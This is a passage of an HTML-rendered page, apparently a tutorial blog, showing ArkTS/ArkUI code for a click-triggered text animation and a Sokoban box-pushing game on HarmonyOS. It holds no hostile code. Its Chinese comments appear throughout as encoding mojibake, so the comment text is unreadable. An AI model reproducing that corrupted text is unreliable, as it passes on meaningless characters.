_index: number</span>) =&gt;</span> &#123; <span class="comment">// éå† list ä¸­çš„æ¯ä¸€ä¸ª Cell</span></span><br><span class="line">          <span class="title class_">Text</span>(item.<span class="property">value</span>)<span class="comment">// æ˜¾ç¤º Cell ä¸­çš„æ–‡å­—</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// è®¾ç½®æ–‡å­—é¢œè‰²ä¸ºç™½è‰²</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">&#x27;50lpx&#x27;</span>)<span class="comment">// è®¾ç½®æ–‡å­—å¤§å°</span></span><br><span class="line">            .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;item.y&#125;</span>lpx`</span> &#125;)<span class="comment">// è®¾ç½®æ–‡å­—çš„å‚ç›´åç§»é‡</span></span><br><span class="line">            .<span class="title function_">opacity</span>(item.<span class="property">opacity</span>) <span class="comment">// è®¾ç½®æ–‡å­—çš„é€æ˜åº¦</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// è®¾ç½®å †æ ˆå¸ƒå±€å®¹å™¨çš„å®½åº¦</span></span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// è®¾ç½®å †æ ˆå¸ƒå±€å®¹å™¨çš„é«˜åº¦</span></span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">BottomEnd</span>) <span class="comment">// è®¾ç½®å¯¹é½æ–¹å¼ä¸ºåº•éƒ¨å³ç«¯</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Image</span>(<span class="variable language_">this</span>.<span class="property">image</span>)<span class="comment">// æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>)<span class="comment">// è®¾ç½®å›¾ç‰‡å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>)<span class="comment">// è®¾ç½®å›¾ç‰‡é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">objectFit</span>(<span class="title class_">ImageFit</span>.<span class="property">Contain</span>)<span class="comment">// å›¾ç‰‡é€‚åº”å®¹å™¨</span></span><br><span class="line">        .<span class="title function_">clickEffect</span>(&#123;</span><br><span class="line">          <span class="comment">// ç‚¹å‡»æ•ˆæœé…ç½®</span></span><br><span class="line">          <span class="attr">scale</span>: <span class="number">0.5</span>, <span class="comment">// ç¼©æ”¾æ¯”ä¾‹</span></span><br><span class="line">          <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> <span class="comment">// æ•ˆæœçº§åˆ«</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»å›¾ç‰‡æ—¶è§¦å‘çš„å›è°ƒ</span></span><br><span class="line">          <span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">indexCount</span> % <span class="variable language_">this</span>.<span class="property">count</span>; <span class="comment">// è®¡ç®—å½“å‰æ»šåŠ¨çš„ç´¢å¼•</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">indexCount</span>++; <span class="comment">// æ›´æ–°ç´¢å¼•è®¡æ•°å™¨</span></span><br><span class="line">          <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">            <span class="comment">// ç«‹å³å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">            <span class="attr">duration</span>: <span class="number">0</span>, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´ä¸º0æ¯«ç§’</span></span><br><span class="line">            <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">              <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                <span class="comment">// å†æ¬¡ç«‹å³å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">                <span class="attr">duration</span>: <span class="number">1000</span>, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´ä¸º1000æ¯«ç§’</span></span><br><span class="line">              &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">y</span> = -<span class="number">200</span> <span class="comment">// è®¾ç½® Cell çš„å‚ç›´åç§»é‡</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">opacity</span> = <span class="number">0</span> <span class="comment">// è®¾ç½® Cell çš„é€æ˜åº¦</span></span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">y</span> = <span class="number">0</span> <span class="comment">// è®¾ç½® Cell çš„å‚ç›´åç§»é‡</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">opacity</span> = <span class="number">1</span> <span class="comment">// è®¾ç½® Cell çš„é€æ˜åº¦</span></span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®¹å™¨é«˜åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®¹å™¨å®½åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºé»‘è‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Sokoban"><a href="#Sokoban" class="headerlink" title="Sokoban"></a>Sokoban</h1><p>æ¨ç®±å­</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span> <span class="comment">// å¯¼å…¥ArkUIå·¥å…·åŒ…ä¸­çš„æç¤ºæ“ä½œæ¨¡å—</span></span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123; <span class="comment">// å®šä¹‰æ¸¸æˆä¸­çš„å•å…ƒæ ¼ç±»</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// è·Ÿè¸ªè£…é¥°å™¨ï¼Œæ ‡è®°å±æ€§ä»¥è¢«è·Ÿè¸ª</span></span><br><span class="line">  <span class="attr">type</span>: number = <span class="number">0</span>; <span class="comment">// å•å…ƒæ ¼ç±»å‹ï¼Œ0ï¼šé€æ˜ï¼Œ1ï¼šå¢™ï¼Œ2ï¼šå¯ç§»åŠ¨åŒºåŸŸ</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">topLeft</span>: number = <span class="number">0</span>; <span class="comment">// å·¦ä¸Šè§’åœ†è§’å¤§å°</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">topRight</span>: number = <span class="number">0</span>; <span class="comment">// å³ä¸Šè§’åœ†è§’å¤§å°</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">bottomLeft</span>: number = <span class="number">0</span>; <span class="comment">// å·¦ä¸‹è§’åœ†è§’å¤§å°</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">bottomRight</span>: number = <span class="number">0</span>; <span class="comment">// å³ä¸‹è§’åœ†è§’å¤§å°</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">x</span>: number = <span class="number">0</span>; <span class="comment">// å•å…ƒæ ¼çš„Xåæ ‡åç§»é‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// å•å…ƒæ ¼çš„Yåæ ‡åç§»é‡</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">cellType: number</span>) &#123; <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = cellType; <span class="comment">// åˆå§‹åŒ–å•å…ƒæ ¼ç±»å‹</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPosition</span> &#123; <span class="comment">// å®šä¹‰ä½ç½®ç±»</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// è·Ÿè¸ªè£…é¥°å™¨ï¼Œæ ‡è®°å±æ€§ä»¥è¢«è·Ÿè¸ª</span></span><br><span class="line">  <span class="attr">x</span>: number = <span class="number">0</span>; <span class="comment">// Xåæ ‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// Yåæ ‡</span></span><br><span class="line">  <span class="title function_">setPosition</span>(<span class="params">x: number, y: number</span>) &#123; <span class="comment">// è®¾ç½®ä½ç½®çš„æ–¹æ³•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span> = x; <span class="comment">// æ›´æ–°Xåæ ‡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = y; <span class="comment">// æ›´æ–°Yåæ ‡</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// å…¥å£è£…é¥°å™¨</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// ç»„ä»¶è£…é¥°å™¨</span></span><br><span class="line">struct <span class="title class_">Sokoban</span>  &#123; <span class="comment">// å®šä¹‰æ¸¸æˆä¸»ç»“æ„</span></span><br><span class="line">  <span class="attr">cellWidth</span>: number = <span class="number">100</span>; <span class="comment">// å•å…ƒæ ¼å®½åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">grid</span>: <span class="title class_">Cell</span>[][] = [ <span class="comment">// æ¸¸æˆç½‘æ ¼çŠ¶æ€</span></span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">victoryPositions</span>: <span class="title class_">MyPosition</span>[] = [<span class="keyword">new</span> <span class="title class_">MyPosition</span>(), <span class="keyword">new</span> <span class="title class_">MyPosition</span>()]; <span class="comment">// èƒœåˆ©ä½ç½®æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cratePositions</span>: <span class="title class_">MyPosition</span>[] = [<span class="keyword">new</span> <span class="title class_">MyPosition</span>(), <span class="keyword">new</span> <span class="title class_">MyPosition</span>()]; <span class="comment">// ç®±å­ä½ç½®æ•°ç»„</span></span><br><span class="line">  <span class="attr">playerPosition</span>: <span class="title class_">MyPosition</span> = <span class="keyword">new</span> <span class="title class_">MyPosition</span>(); <span class="comment">// ç©å®¶ä½ç½®</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartX</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Xåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartY</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Yåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenX</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Xåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenY</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Yåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">startTime</span>: number = <span class="number">0</span>; <span class="comment">// æ¸¸æˆå¼€å§‹æ—¶é—´</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span> <span class="comment">// åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123; <span class="comment">// æ¸¸æˆåŠ è½½å‰çš„å‡†å¤‡å·¥ä½œ</span></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–æŸäº›å•å…ƒæ ¼çš„åœ†è§’å¤§å°...</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">0</span>][<span class="number">1</span>].<span class="property">topLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">0</span>][<span class="number">5</span>].<span class="property">topRight</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="property">topLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">4</span>][<span class="number">0</span>].<span class="property">bottomLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">5</span>][<span class="number">1</span>].<span class="property">bottomLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">5</span>][<span class="number">5</span>].<span class="property">bottomRight</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">1</span>][<span class="number">1</span>].<span class="property">bottomRight</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">4</span>][<span class="number">1</span>].<span class="property">topRight</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">2</span>][<span class="number">4</span>].<span class="property">topLeft</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">2</span>][<span class="number">4</span>].<span class="property">bottomLeft</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>(); <span class="comment">// åˆå§‹åŒ–æ¸¸æˆ</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">initializeGame</span>(<span class="params"></span>) &#123; <span class="comment">// åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´</span></span><br><span class="line">    <span class="comment">// è®¾ç½®èƒœåˆ©ä½ç½®å’Œç®±å­ä½ç½®...</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">victoryPositions</span>[<span class="number">0</span>].<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">victoryPositions</span>[<span class="number">1</span>].<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cratePositions</span>[<span class="number">0</span>].<span class="title function_">setPosition</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cratePositions</span>[<span class="number">1</span>].<span class="title function_">setPosition</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isVictoryPositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºèƒœåˆ©ä½ç½®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">victoryPositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">position</span> =&gt;</span> position.<span class="property">x</span> === x &amp;&amp; position.<span class="property">y</span> === y); <span class="comment">// è¿”å›æ˜¯å¦æœ‰èƒœåˆ©ä½ç½®ä¸ç»™å®šä½ç½®åŒ¹é…</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isCratePositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºç®±å­ä½ç½®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">position</span> =&gt;</span> position.<span class="property">x</span> === x &amp;&amp; position.<span class="property">y</span> === y); <span class="comment">// è¿”å›æ˜¯å¦æœ‰ç®±å­ä½ç½®ä¸ç»™å®šä½ç½®åŒ¹é…</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isPlayerPositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºç©å®¶ä½ç½®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span> === x &amp;&amp; <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span> === y; <span class="comment">// è¿”å›ç©å®¶ä½ç½®æ˜¯å¦ä¸ç»™å®šä½ç½®ç›¸åŒ</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">movePlayer</span>(<span class="params">direction: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">directions</span>: object = <span class="title class_">Object</span>(&#123;</span><br><span class="line">      <span class="string">&#x27;right&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: <span class="number">0</span>, <span class="attr">dy</span>:  <span class="number">1</span>&#125;),</span><br><span class="line">      <span class="string">&#x27;left&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>:<span class="number">0</span> , <span class="attr">dy</span>:-<span class="number">1</span> &#125;),</span><br><span class="line">      <span class="string">&#x27;down&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: <span class="number">1</span>, <span class="attr">dy</span>: <span class="number">0</span> &#125;),</span><br><span class="line">      <span class="string">&#x27;up&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: -<span class="number">1</span>, <span class="attr">dy</span>: <span class="number">0</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">dx</span>: number = directions[direction][<span class="string">&#x27;dx&#x27;</span>]; <span class="comment">//&#123; dx, dy &#125;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">dy</span>: number = directions[direction][<span class="string">&#x27;dy&#x27;</span>]; <span class="comment">//&#123; dx, dy &#125;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">newX</span>: number = <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span> + dx;</span><br><span class="line">    <span class="keyword">const</span> <span 